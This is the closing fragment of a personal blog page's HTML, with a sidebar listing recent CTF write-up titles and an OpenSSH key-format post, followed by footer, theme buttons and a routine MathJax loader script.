onerror="this.onerror=null;this.src='https://github.com/MirRoR4s/MirRoR4s.github.io/blob/main/images/output.jpg'" alt="祥云杯-2022"/></a><div class="content"><a class="title" href="/2022/10/29/%E7%A5%A5%E4%BA%91%E6%9D%AF-2022/index.html" title="祥云杯-2022">祥云杯-2022</a><time datetime="2022-10-29T04:31:22.000Z" title="发表于 2022-10-29 12:31:22">2022-10-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/28/XSCTF-2022/index.html" title="XSCTF-2022"><img src="https://s2.loli.net/2022/10/29/IfNThRa5dqZ2KAH.png" onerror="this.onerror=null;this.src='https://github.com/MirRoR4s/MirRoR4s.github.io/blob/main/images/output.jpg'" alt="XSCTF-2022"/></a><div class="content"><a class="title" href="/2022/10/28/XSCTF-2022/index.html" title="XSCTF-2022">XSCTF-2022</a><time datetime="2022-10-28T13:20:15.000Z" title="发表于 2022-10-28 21:20:15">2022-10-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/27/OpenSSH%E7%A7%81%E9%92%A5%E6%A0%BC%E5%BC%8F%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/index.html" title="OpenSSH私钥格式学习总结"><img src="https://s2.loli.net/2022/10/29/IfNThRa5dqZ2KAH.png" onerror="this.onerror=null;this.src='https://github.com/MirRoR4s/MirRoR4s.github.io/blob/main/images/output.jpg'" alt="OpenSSH私钥格式学习总结"/></a><div class="content"><a class="title" href="/2022/10/27/OpenSSH%E7%A7%81%E9%92%A5%E6%A0%BC%E5%BC%8F%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/index.html" title="OpenSSH私钥格式学习总结">OpenSSH私钥格式学习总结</a><time datetime="2022-10-27T12:33:13.000Z" title="发表于 2022-10-27 20:33:13">2022-10-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/27/SDCTF-2022/index.html" title="SDCTF-2022"><img src="https://s2.loli.net/2022/10/29/IfNThRa5dqZ2KAH.png" onerror="this.onerror=null;this.src='https://github.com/MirRoR4s/MirRoR4s.github.io/blob/main/images/output.jpg'" alt="SDCTF-2022"/></a><div class="content"><a class="title" href="/2022/10/27/SDCTF-2022/index.html" title="SDCTF-2022">SDCTF-2022</a><time datetime="2022-10-27T12:05:20.000Z" title="发表于 2022-10-27 20:05:20">2022-10-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/24/NISACTF%E6%96%B0%E7%94%9F%E8%B5%9B/index.html" title="NISACTF新生赛"><img src="https://s2.loli.net/2022/10/29/IfNThRa5dqZ2KAH.png" onerror="this.onerror=null;this.src='https://github.com/MirRoR4s/MirRoR4s.github.io/blob/main/images/output.jpg'" alt="NISACTF新生赛"/></a><div class="content"><a class="title" href="/2022/10/24/NISACTF%E6%96%B0%E7%94%9F%E8%B5%9B/index.html" title="NISACTF新生赛">NISACTF新生赛</a><time datetime="2022-10-24T05:45:03.000Z" title="发表于 2022-10-24 13:45:03">2022-10-24</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By MirRoR4s</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
+  window.MathJax = {
+    tex: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]],
+      tags: 'ams'
+    },
+    chtml: {
+      scale: 1.2
+    },
+    options: {
+      renderActions: {
+        findScript: [10, doc => {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/)
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+            const text = document.createTextNode('')
+            node.parentNode.replaceChild(text, node)
+            math.start = {node: text, delim: '', n: 0}
+            math.end = {node: text, delim: '', n: 0}
+            doc.math.push(math)
+          }
+        }, ''],
+        insertScript: [200, () => {
+          document.querySelectorAll('mjx-container:not\([display]\)').forEach(node => {
+            const target = node.parentNode
+            if (target.nodeName.toLowerCase() === 'li') {
+              target.parentNode.classList.add('has-jax')
+            } else {
+              target.classList.add('has-jax')
+            }
+          });
+        }, '', false]
+      }
+    }
+  }
+  
+  const script = document.createElement('script')
+  script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
+  script.id = 'MathJax-script'
+  script.async = true
+  document.head.appendChild(script)
+} else {
+  MathJax.startup.document.state(0)
+  MathJax.texReset()
+  MathJax.typeset()
+}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
